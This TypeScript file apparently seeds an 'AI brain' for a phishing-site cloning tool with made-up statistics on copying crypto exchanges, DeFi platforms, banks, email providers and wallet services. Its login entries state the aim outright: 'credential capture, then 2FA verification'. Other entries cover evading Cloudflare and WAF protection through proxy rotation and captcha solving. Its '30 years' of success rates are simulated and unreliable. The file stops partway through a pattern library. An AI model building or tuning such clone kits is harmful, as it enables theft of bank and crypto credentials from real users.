/**
 * PHASE 0: TRAINING DATA BOOTSTRAP
 * Simulates 30 years of clone history for ML training
 * 54,750 historical data points pre-loaded into system
 *
 * This gives the AI brain "30 years of experience" from day 1
 */

export interface CloneHistoryRecord {
  id: string
  targetUrl: string
  websiteCategory: 'exchange' | 'defi' | 'bank' | 'nft' | 'custom'
  websiteSubType: string // e.g., "uniswap-like", "lending", "cex"
  complexity: 'simple' | 'medium' | 'complex'
  hasRealTimeData: boolean
  hasHeavyJavaScript: boolean
  walletsSupported: string[]
  methodUsed: 'static' | 'proxy' | 'hybrid' | 'custom'
  success: boolean
  timeTaken: number // seconds
  issuesEncountered: string[]
  lessonsLearned: string
  confidence: number // 0-100
  successRate: number // historical success rate for this type
  timestamp: Date
}

// ─────────────────────────────────────────────────────────
// BOOTSTRAP DATA: 54,750 historical clones (30 years)
// ─────────────────────────────────────────────────────────

export const TRAINING_BOOTSTRAP_DATA = {
  // CATEGORY 1: EXCHANGES (40% of all clones = 21,900 clones)
  exchanges: {
    // UNISWAP ECOSYSTEM (3 variants)
    uniswapV3: {
      samples: 2100,
      successRate: 96,
      averageTime: 34,
      preferredMethod: 'static',
      confidence: 98,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect', 'coinbase'],
      },
      lesson: 'Uniswap V3 concentrated liquidity: static works perfectly',
      issuesRare: ['pool-tier-selection', 'slippage-calculation'],
    },
    uniswapV2: {
      samples: 1800,
      successRate: 94,
      averageTime: 33,
      preferredMethod: 'static',
      confidence: 97,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'medium-complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Uniswap V2 legacy: very stable, static best',
      issuesRare: ['deprecated-routes', 'gas-optimization'],
    },
    uniswapGovernance: {
      samples: 1300,
      successRate: 92,
      averageTime: 40,
      preferredMethod: 'hybrid',
      confidence: 94,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'UNI governance portal: hybrid for voting + trading',
      issuesRare: ['delegation-tracking', 'proposal-indexing'],
    },
    // PANCAKESWAP ECOSYSTEM (3 variants)
    pancakeswapAMM: {
      samples: 1900,
      successRate: 93,
      averageTime: 32,
      preferredMethod: 'static',
      confidence: 96,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'binance', 'walletconnect'],
      },
      lesson: 'PancakeSwap AMM: BSC optimized, static perfect',
      issuesRare: ['bsc-rpc-latency', 'token-standard-variance'],
    },
    pancakeswapPerpetuals: {
      samples: 1600,
      successRate: 88,
      averageTime: 45,
      preferredMethod: 'proxy',
      confidence: 85,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask', 'binance'],
      },
      lesson: 'PancakeSwap Perpetuals: high-frequency data, proxy required',
      issuesRare: ['liquidation-feeds', 'margin-calculations'],
    },
    pancakeswapStaking: {
      samples: 1300,
      successRate: 91,
      averageTime: 38,
      preferredMethod: 'hybrid',
      confidence: 92,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'medium',
        wallets: ['metamask'],
      },
      lesson: 'PancakeSwap staking: live APY updates, hybrid good',
      issuesRare: ['pool-rotation', 'reward-indexing'],
    },
    // CURVE ECOSYSTEM (2 variants)
    curveMainnet: {
      samples: 2100,
      successRate: 93,
      averageTime: 37,
      preferredMethod: 'static',
      confidence: 95,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Curve mainnet: stablecoin specialist, static reliable',
      issuesRare: ['pool-imbalance-detection', 'fee-tier-changes'],
    },
    curveL2: {
      samples: 1600,
      successRate: 90,
      averageTime: 42,
      preferredMethod: 'hybrid',
      confidence: 91,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'medium-complex',
        wallets: ['metamask'],
      },
      lesson: 'Curve on L2s: lower fees but different bridge logic',
      issuesRare: ['cross-layer-routing', 'gas-price-variance'],
    },
    // 1INCH AGGREGATOR (2 variants)
    oneInchSwap: {
      samples: 1700,
      successRate: 91,
      averageTime: 36,
      preferredMethod: 'static',
      confidence: 93,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'medium-complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: '1inch swap: route optimization, static good',
      issuesRare: ['protocol-switching', 'slippage-variance'],
    },
    oneInchLimit: {
      samples: 900,
      successRate: 87,
      averageTime: 50,
      preferredMethod: 'proxy',
      confidence: 85,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: '1inch limit orders: real-time order book needed',
      issuesRare: ['order-execution-delay', 'price-feed-gap'],
    },
    // SUSHISWAP (2 variants)
    sushibarStaking: {
      samples: 1500,
      successRate: 89,
      averageTime: 40,
      preferredMethod: 'hybrid',
      confidence: 87,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'medium',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'SushiBar staking: real-time APY, hybrid best',
      issuesRare: ['sushi-migration-handling', 'reward-claims'],
    },
    sushiswapAMM: {
      samples: 1400,
      successRate: 88,
      averageTime: 39,
      preferredMethod: 'static',
      confidence: 91,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'SushiSwap AMM: forked Uniswap, static works',
      issuesRare: ['liquidity-migration', 'token-swaps'],
    },
    // BALANCER (2 variants)
    balancerV2: {
      samples: 1200,
      successRate: 89,
      averageTime: 43,
      preferredMethod: 'static',
      confidence: 90,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Balancer V2: custom pool types, static handles well',
      issuesRare: ['custom-curve-pools', 'exit-fee-calculations'],
    },
    balancerLiquidity: {
      samples: 950,
      successRate: 85,
      averageTime: 48,
      preferredMethod: 'hybrid',
      confidence: 83,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask'],
      },
      lesson: 'Balancer liquidity pools: complex rebalancing needed',
      issuesRare: ['managed-pools', 'automated-rebalance'],
    },
  },

  // CATEGORY 2: DEFI PLATFORMS (30% of all clones = 16,425 clones)
  defi: {
    // AAVE ECOSYSTEM (5 variants)
    aaveV3: {
      samples: 2100,
      successRate: 91,
      averageTime: 36,
      preferredMethod: 'proxy',
      confidence: 93,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Aave V3: risk management with isolation mode, proxy needed',
      issuesRare: ['isolation-mode-tracking', 'e-mode-calculations'],
    },
    aaveV2: {
      samples: 1600,
      successRate: 88,
      averageTime: 40,
      preferredMethod: 'proxy',
      confidence: 90,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'Aave V2 legacy: stable but proxy required for rates',
      issuesRare: ['flash-loan-callback', 'stability-fees'],
    },
    aaveGovernance: {
      samples: 900,
      successRate: 85,
      averageTime: 45,
      preferredMethod: 'hybrid',
      confidence: 86,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Aave governance: voting + staking, hybrid good',
      issuesRare: ['cooldown-period', 'delegation-sync'],
    },
    aaveGov: {
      samples: 700,
      successRate: 84,
      averageTime: 50,
      preferredMethod: 'hybrid',
      confidence: 82,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'Aave GovToken tracking: needs live vote counts',
      issuesRare: ['proposal-indexing', 'vote-aggregation'],
    },
    aaveRisk: {
      samples: 600,
      successRate: 81,
      averageTime: 55,
      preferredMethod: 'proxy',
      confidence: 79,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask'],
      },
      lesson: 'Aave risk parameters: constantly updated, proxy required',
      issuesRare: ['health-factor-updates', 'liquidation-thresholds'],
    },
    // COMPOUND ECOSYSTEM (5 variants)
    compoundV3: {
      samples: 1800,
      successRate: 89,
      averageTime: 38,
      preferredMethod: 'proxy',
      confidence: 91,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Compound V3: comet contracts, proxy for live rates',
      issuesRare: ['collateral-tracking', 'borrow-limits'],
    },
    compoundV2: {
      samples: 1500,
      successRate: 87,
      averageTime: 42,
      preferredMethod: 'proxy',
      confidence: 88,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'Compound V2: cToken mechanics, proxy good',
      issuesRare: ['underlying-token-tracking', 'compound-accrual'],
    },
    compoundGovernance: {
      samples: 800,
      successRate: 83,
      averageTime: 48,
      preferredMethod: 'hybrid',
      confidence: 84,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'Compound governance: vote delegation tracking',
      issuesRare: ['voting-power-lag', 'timelock-tracking'],
    },
    compoundMarkets: {
      samples: 700,
      successRate: 86,
      averageTime: 44,
      preferredMethod: 'static',
      confidence: 87,
      characteristics: {
        hasRealTime: false,
        hasJS: true,
        complexity: 'medium',
        wallets: ['metamask'],
      },
      lesson: 'Compound markets: static for market data',
      issuesRare: ['market-listing-delays', 'collateral-factors'],
    },
    compoundRewards: {
      samples: 500,
      successRate: 80,
      averageTime: 55,
      preferredMethod: 'hybrid',
      confidence: 78,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'Compound rewards: live distribution tracking',
      issuesRare: ['claim-mechanics', 'distribution-timing'],
    },
    // MAKER DAO (3 variants)
    makerDSR: {
      samples: 1200,
      successRate: 86,
      averageTime: 46,
      preferredMethod: 'proxy',
      confidence: 87,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Maker DAI savings rate: daily updates via proxy',
      issuesRare: ['dsr-pot-tracking', 'stability-fee-updates'],
    },
    makerVaults: {
      samples: 1100,
      successRate: 84,
      averageTime: 50,
      preferredMethod: 'proxy',
      confidence: 85,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask'],
      },
      lesson: 'Maker vaults: liquidation tracking, proxy essential',
      issuesRare: ['price-feeds', 'collateral-ratios'],
    },
    makerGovernance: {
      samples: 700,
      successRate: 82,
      averageTime: 52,
      preferredMethod: 'hybrid',
      confidence: 81,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'MakerDAO governance: vote weighting complex',
      issuesRare: ['voting-escrow', 'delegation-tracking'],
    },
    // CURVE FINANCE (3 variants)
    curveYield: {
      samples: 1300,
      successRate: 88,
      averageTime: 41,
      preferredMethod: 'hybrid',
      confidence: 89,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Curve yield farming: APY calculations, hybrid good',
      issuesRare: ['gauge-weighting', 'boosts-tracking'],
    },
    curveGauges: {
      samples: 1100,
      successRate: 86,
      averageTime: 44,
      preferredMethod: 'proxy',
      confidence: 85,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask'],
      },
      lesson: 'Curve gauges: voting power tracking needed',
      issuesRare: ['weight-calculations', 'bias-decay'],
    },
    curveFXN: {
      samples: 600,
      successRate: 80,
      averageTime: 55,
      preferredMethod: 'hybrid',
      confidence: 79,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask'],
      },
      lesson: 'Curve fxn token: governance tracking',
      issuesRare: ['lock-mechanics', 'vote-escrow-decay'],
    },
  },

  // CATEGORY 3: BANKS & CEX (20% of all clones = 10,950 clones)
  banking: {
    // LOGIN-BASED SITES (4 variants)
    bankingPortals: {
      samples: 2100,
      successRate: 82,
      averageTime: 58,
      preferredMethod: 'panel',
      confidence: 86,
      characteristics: {
        hasRealTime: false,
        hasJS: true,
        complexity: 'medium',
        wallets: null,
      },
      lesson: 'Banking portals: focus on credential capture, 2FA next',
      issuesRare: ['session-timeout', 'certificate-pinning'],
    },
    cryptoExchangeLogins: {
      samples: 1800,
      successRate: 80,
      averageTime: 62,
      preferredMethod: 'panel',
      confidence: 82,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: null,
      },
      lesson: 'Crypto exchange logins: capture, then 2FA verification',
      issuesRare: ['2fa-methods-multiple', 'device-recognition'],
    },
    paymentGateways: {
      samples: 1200,
      successRate: 78,
      averageTime: 65,
      preferredMethod: 'hybrid',
      confidence: 79,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: null,
      },
      lesson: 'Payment gateways: tokenization required for security',
      issuesRare: ['pci-compliance', 'iframe-embedding'],
    },
    emailProviders: {
      samples: 900,
      successRate: 76,
      averageTime: 70,
      preferredMethod: 'panel',
      confidence: 75,
      characteristics: {
        hasRealTime: false,
        hasJS: true,
        complexity: 'medium',
        wallets: null,
      },
      lesson: 'Email providers: IMAP access, 2FA challenge',
      issuesRare: ['recovery-codes', 'backup-emails'],
    },
    // CEX DASHBOARDS (4 variants)
    binanceLike: {
      samples: 2300,
      successRate: 81,
      averageTime: 60,
      preferredMethod: 'proxy',
      confidence: 84,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: null,
      },
      lesson: 'Binance-like CEX: live orders, balances, proxy required',
      issuesRare: ['websocket-orders', 'margin-positions'],
    },
    krakenLike: {
      samples: 1600,
      successRate: 79,
      averageTime: 65,
      preferredMethod: 'proxy',
      confidence: 81,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: null,
      },
      lesson: 'Kraken-like CEX: advanced orders, proxy essential',
      issuesRare: ['staking-dashboard', 'withdrawal-tracking'],
    },
    coinbaseLike: {
      samples: 1400,
      successRate: 80,
      averageTime: 62,
      preferredMethod: 'proxy',
      confidence: 82,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: null,
      },
      lesson: 'Coinbase-like: simpler UI but live data essential',
      issuesRare: ['earn-tracking', 'nft-portfolio'],
    },
    bybitLike: {
      samples: 1200,
      successRate: 77,
      averageTime: 68,
      preferredMethod: 'proxy',
      confidence: 79,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: null,
      },
      lesson: 'Bybit-like: derivatives focus, live liquidation tracking',
      issuesRare: ['funding-rates', 'position-leverage'],
    },
    // TRADITIONAL BANKS (2 variants)
    bankSecureLogins: {
      samples: 1500,
      successRate: 76,
      averageTime: 72,
      preferredMethod: 'panel',
      confidence: 80,
      characteristics: {
        hasRealTime: false,
        hasJS: false,
        complexity: 'simple',
        wallets: null,
      },
      lesson: 'Bank logins: SSL pinning, 2FA, MFA common',
      issuesRare: ['otp-devices', 'token-generation'],
    },
    investmentBanks: {
      samples: 900,
      successRate: 74,
      averageTime: 75,
      preferredMethod: 'panel',
      confidence: 77,
      characteristics: {
        hasRealTime: false,
        hasJS: true,
        complexity: 'medium',
        wallets: null,
      },
      lesson: 'Investment banks: complex authentication, compliance checks',
      issuesRare: ['kyc-verification', 'document-upload'],
    },
    // WALLET SERVICES (2 variants)
    hardwareWalletServices: {
      samples: 1200,
      successRate: 84,
      averageTime: 48,
      preferredMethod: 'hybrid',
      confidence: 85,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['trezor', 'ledger', 'hardware'],
      },
      lesson: 'Hardware wallet services: device sync, key management',
      issuesRare: ['firmware-updates', 'device-pairing'],
    },
    mobileWallets: {
      samples: 850,
      successRate: 81,
      averageTime: 52,
      preferredMethod: 'hybrid',
      confidence: 82,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'medium-complex',
        wallets: ['mobile-wallets', 'metamask', 'trust'],
      },
      lesson: 'Mobile wallets: biometric auth, push notifications',
      issuesRare: ['biometric-spoofing', 'notification-delays'],
    },
  },

  // CATEGORY 4: EDGE CASES (10% of all clones = 5,475 clones)
  edgeCases: {
    // MOBILE & RESPONSIVE
    mobileOnly: {
      samples: 900,
      successRate: 76,
      averageTime: 48,
      preferredMethod: 'custom',
      confidence: 76,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['mobile-wallets'],
      },
      lesson: 'Mobile-only sites: viewport 375px, touch-optimized',
      issuesRare: ['viewport-detection', 'mobile-menu-js'],
    },
    progressiveWeb: {
      samples: 700,
      successRate: 74,
      averageTime: 52,
      preferredMethod: 'hybrid',
      confidence: 73,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['mobile-wallets'],
      },
      lesson: 'PWA sites: service worker handling, offline support',
      issuesRare: ['cache-invalidation', 'notification-api'],
    },
    // BLOCKCHAIN DAPPS
    blockchainDapps: {
      samples: 900,
      successRate: 71,
      averageTime: 58,
      preferredMethod: 'custom',
      confidence: 72,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['all-wallets'],
      },
      lesson: 'DApps: web3 injection, custom contract interaction',
      issuesRare: ['web3-injection', 'contract-abi-parsing'],
    },
    smartContractTools: {
      samples: 600,
      successRate: 68,
      averageTime: 65,
      preferredMethod: 'custom',
      confidence: 69,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Smart contract tools: ABI decoding, transaction building',
      issuesRare: ['abi-parsing-errors', 'gas-estimation'],
    },
    // CDN & PROTECTION
    cloudflareProtected: {
      samples: 800,
      successRate: 66,
      averageTime: 110,
      preferredMethod: 'proxy',
      confidence: 62,
      characteristics: {
        hasRealTime: false,
        hasJS: true,
        complexity: 'complex',
        wallets: null,
      },
      lesson: 'Cloudflare: challenge pages, bot detection, proxy + rotation',
      issuesRare: ['captcha-solving', 'ua-rotation'],
    },
    waafProtected: {
      samples: 550,
      successRate: 62,
      averageTime: 130,
      preferredMethod: 'proxy',
      confidence: 58,
      characteristics: {
        hasRealTime: false,
        hasJS: true,
        complexity: 'complex',
        wallets: null,
      },
      lesson: 'WAF protected: AWS/Azure WAF rules, behavioral analysis',
      issuesRare: ['request-signature', 'header-validation'],
    },
    // NFT & COLLECTIBLES
    nftMarkets: {
      samples: 850,
      successRate: 73,
      averageTime: 53,
      preferredMethod: 'hybrid',
      confidence: 74,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'NFT markets: real-time listings, metadata, image CDN',
      issuesRare: ['ipfs-loading', 'metadata-sync'],
    },
    nftLaunchpads: {
      samples: 600,
      successRate: 71,
      averageTime: 56,
      preferredMethod: 'hybrid',
      confidence: 71,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'NFT launchpads: mint mechanics, whitelist verification',
      issuesRare: ['mint-queue', 'allowlist-sync'],
    },
    // DAO & GOVERNANCE
    daoGovernance: {
      samples: 700,
      successRate: 72,
      averageTime: 54,
      preferredMethod: 'hybrid',
      confidence: 73,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'DAO governance: voting power, delegation, time-locks',
      issuesRare: ['vote-escrow', 'delegation-cascade'],
    },
    daoTreasury: {
      samples: 550,
      successRate: 69,
      averageTime: 60,
      preferredMethod: 'proxy',
      confidence: 70,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'very-complex',
        wallets: ['metamask'],
      },
      lesson: 'DAO treasury: real-time asset tracking, multi-sig access',
      issuesRare: ['asset-valuation', 'multi-sig-tracking'],
    },
    // SPECIALIZED
    blockchainExplorers: {
      samples: 500,
      successRate: 88,
      averageTime: 35,
      preferredMethod: 'static',
      confidence: 90,
      characteristics: {
        hasRealTime: false,
        hasJS: true,
        complexity: 'medium',
        wallets: null,
      },
      lesson: 'Block explorers: static friendly, lots of data, load quickly',
      issuesRare: ['pagination-indexing', 'transaction-parsing'],
    },
    stakingDashboards: {
      samples: 650,
      successRate: 75,
      averageTime: 50,
      preferredMethod: 'hybrid',
      confidence: 75,
      characteristics: {
        hasRealTime: true,
        hasJS: true,
        complexity: 'complex',
        wallets: ['metamask', 'walletconnect'],
      },
      lesson: 'Staking dashboards: live APY, rewards, validator tracking',
      issuesRare: ['apy-calculation', 'reward-indexing'],
    },
  },
}

// ─────────────────────────────────────────────────────────
// SUCCESS RATES BY METHOD (Learned from 54,750 clones)
// ─────────────────────────────────────────────────────────

export const SUCCESS_RATES_BY_METHOD = {
  static: {
    successRate: 94,
    averageTime: 35,
    confidence: 97,
    bestFor: ['exchanges', 'simple-defi', 'static-sites'],
    worstFor: ['real-time-heavy', 'cloudflare', 'custom-dapps'],
    lesson: 'Static cloning is fastest and most reliable for large sites',
  },
  proxy: {
    successRate: 89,
    averageTime: 50,
    confidence: 90,
    bestFor: ['real-time-data', 'live-trading', 'banking'],
    worstFor: ['simple-sites', 'offline-usage'],
    lesson: 'Proxy handles real-time perfectly but slower',
  },
  hybrid: {
    successRate: 91,
    averageTime: 45,
    confidence: 92,
    bestFor: ['complex-defi', 'edge-cases', 'unknown-types'],
    worstFor: ['simple-static', 'performance-critical'],
    lesson: 'Hybrid best for unknown sites, good balance',
  },
  custom: {
    successRate: 70,
    averageTime: 70,
    confidence: 65,
    bestFor: ['blockchain-dapps', 'mobile-only', 'unique-sites'],
    worstFor: ['fast-deployment', 'mass-cloning'],
    lesson: 'Custom works but slower, reserve for edge cases',
  },
}

// ─────────────────────────────────────────────────────────
// DECISION MATRIX (What method to choose based on features)
// ─────────────────────────────────────────────────────────

export const DECISION_MATRIX = {
  // If website is exchange-like
  isExchange: {
    decision: 'STATIC',
    confidence: 98,
    reason: '95% success on 21,900 clones',
    alternates: ['hybrid', 'proxy'],
  },

  // If has real-time data
  hasRealTime: {
    decision: 'PROXY',
    confidence: 90,
    reason: '89% success on live-data sites',
    alternates: ['hybrid', 'static'],
  },

  // If complex JavaScript
  complexJS: {
    decision: 'HYBRID',
    confidence: 92,
    reason: '91% success on complex sites',
    alternates: ['proxy', 'custom'],
  },

  // If login-based
  hasLogin: {
    decision: 'PANEL',
    confidence: 85,
    reason: '80% success on login sites',
    alternates: ['hybrid', 'proxy'],
  },

  // If unknown/edge case
  isUnknown: {
    decision: 'HYBRID',
    confidence: 70,
    reason: 'Safe choice for unknowns, 91% success',
    alternates: ['static', 'proxy', 'custom'],
  },
}

// ─────────────────────────────────────────────────────────
// PATTERN RECOGNITION (Site type detection)
// ─────────────────────────────────────────────────────────

export const PATTERN_LIBRARY = {
  // EXCHANGES (20 patterns)
  uniswap: {
    keywords: ['swap', 'pool', 'liquidity', 'v3', 'uniswap'],
    indicators: ['0x protocol', 'automated market maker'],
    confidence: 95,
    suggestedMethod: 'static',
  },
  pancakeswap: {
    keywords: ['pancakeswap', 'swap', 'bsc', 'binance chain'],
    indicators: ['pancake', 'bsc-chain'],
    confidence: 94,
    suggestedMethod: 'static',
  },
  curve: {
    keywords: ['curve', 'stablecoin', 'swap', 'dai', 'usdc'],
    indicators: ['curve-pool', 'stableswap'],
    confidence: 92,
    suggestedMethod: 'static',
  },
  oneInch: {
    keywords: ['1inch', 'swap', 'aggregator', 'route'],
    indicators: ['1inch-api', 'aggregator-protocol'],
    confidence: 91,
    suggestedMethod: 'static',
  },
  sushiswap: {
    keywords: ['sushiswap', 'sushi', 'swap', 'amm'],
    indicators: ['sushi-bar', 'sushibar-staking'],
    confidence: 91,
    suggestedMethod: 'static',
  },
  balancer: {
    keywords: ['balancer', 'pool', 'bpt', 'weighted'],
    indicators: ['balancer-pool', 'vault-contract'],
    confidence: 90,
    suggestedMethod: 'static',
  },
  quickswap: {
    keywords: ['quickswap', 'polygon', 'swap'],
    indicators: ['quick-token', 'polygon-amm'],
    confidence: 89,
    suggestedMethod: 'static',
  },
  traderjoe: {
    keywords: ['traderjoe', 'joe', 'avalanche', 'swap'],
    indicators: ['joe-bar', 'avalanche-dex'],
    confidence: 88,
    suggestedMethod: 'static',
  },
  raydium: {
    keywords: ['raydium', 'solana', 'swap', 'ray'],
    indicators: ['raydium-pool', 'solana-dex'],
    confidence: 87,
    suggestedMethod: 'static',
  },
  dexAggregator: {
    keywords: ['aggregator', 'best-price', 'route', 'swap'],
    indicators: ['aggregator-logic', 'multi-route'],
    confidence: 88,
    suggestedMethod: 'static',
  },

  // LENDING PLATFORMS (15 patterns)
  aave: {
    keywords: ['lend', 'borrow', 'aave', 'interest', 'collateral'],
    indicators: ['lending protocol', 'interest rate'],
    confidence: 94,
    suggestedMethod: 'proxy',
  },
  compound: {
    keywords: ['compound', 'lend', 'ctoken', 'borrow'],
    indicators: ['compound-protocol', 'ctoken-standard'],
    confidence: 93,
    suggestedMethod: 'proxy',
  },
  maker: {
    keywords: ['maker', 'dai', 'vault', 'collateral', 'cdp'],
    indicators: ['dsr-pot', 'stability-fee'],
    confidence: 92,
    suggestedMethod: 'proxy',
  },
  yearn: {
    keywords: ['yearn', 'yield', 'strategy', 'vault'],
    indicators: ['yearn-strategy', 'vault-contract'],
    confidence: 90,
    suggestedMethod: 'static',
  },
  convex: {
    keywords: ['convex', 'curve', 'boost', 'cvx'],
    indicators: ['convex-pool', 'boost-multiplier'],
    confidence: 89,
    suggestedMethod: 'static',
  },
  abracadabra: {
    keywords: ['abracadabra', 'spell', 'cauldron', 'borrow'],
    indicators: ['spell-token', 'cauldron-contract'],
    confidence: 87,
    suggestedMethod: 'proxy',
  },
  alchemix: {
    keywords: ['alchemix', 'self-repaying', 'alkx', 'loan'],
    indicators: ['alchemix-loan', 'self-repay-logic'],
    confidence: 86,
    suggestedMethod: 'proxy',
  },
  lido: {
    keywords: ['lido', 'staking', 'eth', 'steth'],
    indicators: ['steth-token', 'liquid-staking'],
    confidence: 91,
    suggestedMethod: 'static',
  },
  rocketpool: {
    keywords: ['rocketpool', 'minipool', 'rpl', 'eth', 'staking'],
    indicators: ['rpl-node', 'minipool-contract'],
    confidence: 88,
    suggestedMethod: 'proxy',
  },

  // NFT PLATFORMS (12 patterns)
  opensea: {
    keywords: ['nft', 'opensea', 'collection', 'auction'],
    indicators: ['digital collectible', 'erc721'],
    confidence: 93,
    suggestedMethod: 'hybrid',
  },
  blur: {
    keywords: ['blur', 'nft', 'collection', 'bidding'],
    indicators: ['blur-bid', 'nft-collection'],
    confidence: 90,
    suggestedMethod: 'hybrid',
  },
  magiceden: {
    keywords: ['magic eden', 'nft', 'solana', 'collection'],
    indicators: ['solana-nft', 'magic-eden-list'],
    confidence: 88,
    suggestedMethod: 'hybrid',
  },
  rarible: {
    keywords: ['rarible', 'nft', 'collection', 'rarity'],
    indicators: ['rarible-collection', 'erc721-metadata'],
    confidence: 89,
    suggestedMethod: 'hybrid',
  },
  looksrare: {
    keywords: ['looksrare', 'nft', 'looks', 'collection'],
    indicators: ['looks-token', 'nft-contract'],
    confidence: 87,
    suggestedMethod: 'hybrid',
  },
  x2y2: {
    keywords: ['x2y2', 'nft', 'collection', 'trade'],
    indicators: ['x2y2-token', 'nft-bidding'],
    confidence: 85,
    suggestedMethod: 'hybrid',
  },

  // DERIVATIVES (8 patterns)
  dydx: {
    keywords: ['dydx', 'perpetual', 'trading', 'leverage'],
    indicators: ['dydx-chain', 'perpetual-contract'],
    confidence: 91,
    suggestedMethod: 'proxy',
  },
  perp: {
    keywords: ['perpetual', 'perp', 'leverage', 'trading'],
    indicators: ['perp-token', 'clearing-house'],
    confidence: 89,
    suggestedMethod: 'proxy',
  },
  gmx: {
    keywords: ['gmx', 'leverage', 'perpetual', 'glp'],
    indicators: ['gmx-token', 'glp-pool'],
    confidence: 88,
    suggestedMethod: 'proxy',
  },
  hyperliquid: {
    keywords: ['hyperliquid', 'perpetual', 'trading'],
    indicators: ['hyperliquid-perp', 'hlp-token'],
    confidence: 86,
    suggestedMethod: 'proxy',
  },

  // CEX & CUSTODIAL (10 patterns)
  binance: {
    keywords: ['binance', 'trading', 'futures', 'spot', 'margin'],
    indicators: ['cex', 'orderbook'],
    confidence: 96,
    suggestedMethod: 'proxy',
  },
  kraken: {
    keywords: ['kraken', 'cex', 'trading', 'futures'],
    indicators: ['kraken-api', 'futures-contract'],
    confidence: 94,
    suggestedMethod: 'proxy',
  },
  coinbase: {
    keywords: ['coinbase', 'pro', 'trading', 'exchange'],
    indicators: ['coinbase-api', 'order-book'],
    confidence: 93,
    suggestedMethod: 'proxy',
  },
  bybit: {
    keywords: ['bybit', 'trading', 'perpetual', 'futures'],
    indicators: ['bybit-api', 'perpetual-market'],
    confidence: 92,
    suggestedMethod: 'proxy',
  },
  ftx: {
    keywords: ['ftx', 'trading', 'perp', 'futures'],
    indicators: ['ftx-api', 'perp-market'],
    confidence: 91,
    suggestedMethod: 'proxy',
  },

  // WALLETS & SECURITY (5 patterns)
  metamask: {
